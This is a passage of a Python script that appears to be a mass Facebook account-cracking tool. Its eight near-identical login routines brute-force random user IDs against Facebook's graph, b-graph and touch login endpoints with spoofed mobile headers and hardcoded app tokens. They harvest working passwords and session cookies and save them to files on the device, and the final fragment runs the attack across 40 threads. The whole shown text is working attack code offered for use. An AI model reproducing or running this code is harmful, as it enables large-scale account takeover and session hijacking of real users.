    print(f"\n{wx}{47*'-'}");print(f'{xd} THE PROCESS HAS COMPLETED');print(f"{xd} TOTAL OK IDS {bx}:{gx} {len(oks)}");print(f"{xd} TOTAL CP IDS {bx}:\x1b[38;5;205m {len(cps)}");print(f"{xd} TOTAL 2FA IDS {bx}:\x1b[38;5;214m {len(twf)}");print(f"{wx}{47*'-'}");exit()

#------------->> RANDOM METHOD M1 B-GRAPH >>-------------#
def ____M_E_T_H_O_D_A____(ids,passlist,tl):
        global loop,oks,cps,twf
        if not check_internet():
            wait_for_internet()
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
        ua = get_ua()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839","currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers = {'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': '45204','X-FB-SIM-HNI': '45201','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','Content-Length': '698'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                year = tutulx(str(uid))
                                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                if 'y' in show_cookies:
                                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                os.system('espeak -a 300 "GEN,  Ok,  id"')
                                open('/sdcard/GEN-M1-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                if 'y' in pcp:
                                    year = tutulx(str(uid))
                                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                    os.system('espeak -a 300 "Cp"')
                                open('/sdcard/GEN-M1-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> RANDOM METHOD M2 GRAPH >>-------------#
def ____M_E_T_H_O_D_B____(ids,passlist,tl):
        global loop,oks,cps,twf
        if not check_internet():
            wait_for_internet()
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
        ua = get_ua()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','fb_api_req_friendly_name':'authenticate',}
                        headers = {'Authorization':f'OAuth {accessToken}','X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent':ua,'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                year = tutulx(str(uid))
                                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                if 'y' in show_cookies:
                                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                os.system('espeak -a 300 "GEN,  Ok,  id"')
                                open('/sdcard/GEN-M2-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                if 'y' in pcp:
                                    year = tutulx(str(uid))
                                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                    os.system('espeak -a 300 "Cp"')
                                open('/sdcard/GEN-M2-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> RANDOM METHOD M3 >>-------------#
def ____M_E_T_H_O_D_C____(ids,passlist,tl):
        global loop,oks,cps,twf
        if not check_internet():
            wait_for_internet()
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
        ua = get_ua()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        data = {'adid':adid,'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,"logged_out_id": str(uuid.uuid4()),"hash_id": str(uuid.uuid4()),"reg_instance": str(uuid.uuid4()),"session_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),'generate_analytics_claims':'1','credentials_type':'password','source':'login',"sim_country": "id","network_country": "id","relative_url": "method/auth.login",'error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','fb_api_req_friendly_name':'authenticate',"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                        headers = {'Authorization':f'OAuth {accessToken}',"X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),'X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent': ua,'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                year = tutulx(str(uid))
                                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                if 'y' in show_cookies:
                                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                os.system('espeak -a 300 "GEN,  Ok,  id"')
                                open('/sdcard/GEN-M3-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                if 'y' in pcp:
                                    year = tutulx(str(uid))
                                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                    os.system('espeak -a 300 "Cp"')
                                open('/sdcard/GEN-M3-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> RANDOM METHOD M4 >>-------------#
def ____M_E_T_H_O_D_D____(ids,passlist,tl):
        global loop,oks,cps,twf
        if not check_internet():
            wait_for_internet()
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
        ua = get_ua()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                year = tutulx(str(uid))
                                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                if 'y' in show_cookies:
                                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                os.system('espeak -a 300 "GEN,  Ok,  id"')
                                open('/sdcard/GEN-M4-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                if 'y' in pcp:
                                    year = tutulx(str(uid))
                                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                    os.system('espeak -a 300 "Cp"')
                                open('/sdcard/GEN-M4-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> RANDOM METHOD M5 >>-------------#
def ____M_E_T_H_O_D_E____(ids,passlist,tl):
	global loop,oks,cps,twf
	xp=f"{bx}[{gx}MR{bx}]{gx}"
	sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
	ewe = requests.Session()
	ua = get_ua()
	
	# Single GET request to get tokens once
	try:
		link = ewe.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
		# Extract tokens once
		m_ts = re.search(r'name="m_ts" value="(.*?)"', str(link)).group(1)
		li_val = re.search(r'name="li" value="(.*?)"', str(link)).group(1)
		jazoest = re.search(r'name="jazoest" value="(\d+)"', str(link)).group(1)
		lsd_val = re.search(r'name="lsd" value="(.*?)"', str(link)).group(1)
	except:
		return
	
	# Now loop through passwords using the same tokens
	for pas in passlist:
		try:
			data = {"m_ts": m_ts,"li": li_val,"try_number": 0,"unrecognized_tries": 0,"email": ids,"prefill_contact_point": ids,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"jazoest": jazoest,"lsd": lsd_val}
			headers = {"Host": "touch.facebook.com","content-length": str(len((data))),"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search(r'Chrome/(\d+)', str(ua)).group(1),re.search(r'Chrome/(\d+)', str(ua)).group(1)),"sec-ch-ua-mobile": "?1","user-agent": ua,"x-response-format": "JSONStream","content-type": "application/x-www-form-urlencoded","x-fb-lsd": lsd_val,"viewport-width": "360","x-requested-with": "XMLHttpRequest","x-asbd-id": "129477","dpr": "2","sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://touch.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			response = ewe.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = data,headers = headers,allow_redirects = False)
			if "checkpoint" in ewe.cookies.get_dict():
				uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				if 'y' in pcp:
				    year = tutulx(str(uid))
				    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
				    os.system('espeak -a 300 "Cp"')
				open('/sdcard/GEN-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			elif "c_user" in ewe.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				uid = re.findall('c_user=(.*);xs', kuki)[0]
				year = tutulx(str(uid))
				print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
				if 'y' in show_cookies:
				    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+kuki);print('')
				os.system('espeak -a 300 "GEN,  Ok,  id"')
				open('/sdcard/GEN-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+kuki+'\n')
				oks.append(str(uid))
				break
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
	
#------------->> RANDOM METHOD M6 >>-------------#
def ____M_E_T_H_O_D_F____(ids,passlist,tl):
    global loop,oks,cps,twf
    if not check_internet():
        wait_for_internet()
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
    ua = get_ua()
    
    for pas in passlist:
        # Use Nigerian user agent
        ua = get_ua()
        
        datax = {
            'adid': str(uuid.uuid4()), 
            'format': 'json', 
            'device_id': str(uuid.uuid4()), 
            'email': ids, 
            'password': pas, 
            'generate_analytics_claims': '1', 
            'community_id': '', 
            'cpl': 'true', 
            'try_num': '1', 
            'family_device_id': str(uuid.uuid4()), 
            'credentials_type': 'password', 
            'source': 'login', 
            'error_detail_type': 'button_with_disabled', 
            'enroll_misauth': 'false', 
            'generate_session_cookies': '1', 
            'generate_machine_id': '1', 
            'currently_logged_in_userid': '0', 
            'fb_api_req_friendly_name': 'authenticate'
        }
        
        header = {
            'User-Agent': ua, 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 50000000)), 
            'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
            'X-FB-Connection-Type': random.choice(['WIFI', 'CELLULAR', 'MOBILE.4G']), 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True'
        }
        
        try:
            lo = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False, timeout=30).json()
            
            if 'session_key' in lo:
                cki = lo['session_cookies']
                ck = {}
                for xk in cki:
                    ck.update({xk['name']: xk['value']})
                coki = ';'.join(['%s=%s' % (key, value) for key, value in ck.items()])
                uid = lo['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                if 'y' in show_cookies:
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-M6-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                oks.append(str(uid))
                break
            elif 'www.facebook.com' in lo['error']['message']:
                uid = lo['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-M6-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                cps.append(str(uid))
                break
            else:
                continue
                
        except requests.exceptions.ConnectionError:
            continue
        except requests.exceptions.Timeout:
            continue
        except json.JSONDecodeError:
            continue
        except Exception as e:
            continue
            
    loop +=1
  
#------------->> RANDOM METHOD M7 >>-------------#
def ____M_E_T_H_O_D_G____(ids,passlist,tl):
    global loop,oks,cps,twf
    if not check_internet():
        wait_for_internet()
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
    ua = get_ua()
    
    for pas in passlist:
        if not check_internet():
            wait_for_internet()
        try:
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json", 
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled", 
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com", 
                "User-Agent": ua,
                "X-FB-Net-HNI": "45204",
                "X-FB-SIM-HNI": "45201", 
                "X-FB-Connection-Type": "MOBILE.LTE",
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                "x-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation", 
                "X-FB-Request-Analytics-Tags": "graphservice",
                "Accept-Encoding": "gzip, deflate",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True", 
                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                "Connection": "Keep-Alive"
            }
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            
            if 'session_key' in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                uid = po['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                if 'y' in show_cookies:
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-M7-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                oks.append(str(uid))
                break
            elif 'www.facebook.com' in po['error']['message']:
                uid = po['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-M7-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                cps.append(str(uid))
                break
        except Exception as e:
            continue
    loop += 1

#------------->> RANDOM METHOD M8 >>-------------#
def ____M_E_T_H_O_D_H____(ids,passlist,tl):
    try:
        global loop,oks,cps,twf
        if not check_internet():
            wait_for_internet()
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
        
        for pas in passlist:
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': ids,
                'password': pas,
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            
            headers = {
                'User-Agent': get_ua(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            
            q = requests.post("https://graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).json()
            
            if "session_key" in q:
                token = q["access_token"]
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{coki}"
                uid = q['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                if 'y' in show_cookies:
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+cookies);print('')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-M8-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+cookies+'\n')
                open('/sdcard/GEN-M8-RNDM-TOKEN.txt','a').write(token+'\n')
                oks.append(str(uid))
                break
            elif 'www.facebook.com' in q['error']['message']:
                uid = q['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-M8-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                cps.append(str(uid))
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(2)
        ____M_E_T_H_O_D_H____(ids,passlist,tl)
    except Exception as e:
        pass

#------------->> OLD MAIN MENU >>-------------#
def ____O_L_D____():
	clear();print(f'{xd} EXAMPLE {bx}:{gx} 5555 {bx}|{gx} 7777 {bx}|{gx} 9999 {bx}|{gx} 99999 ');linex();limit = int(input(f'{xdx} SELECTION {bx}:{wx} '))
	___B_A_L___ = "10000"
	for ixx in range(int(limit)):khalifa = str(random.choice(range(1000000000,1999999999)));user.append(khalifa)
	with tred(max_workers=40) as ____D_O_N____:
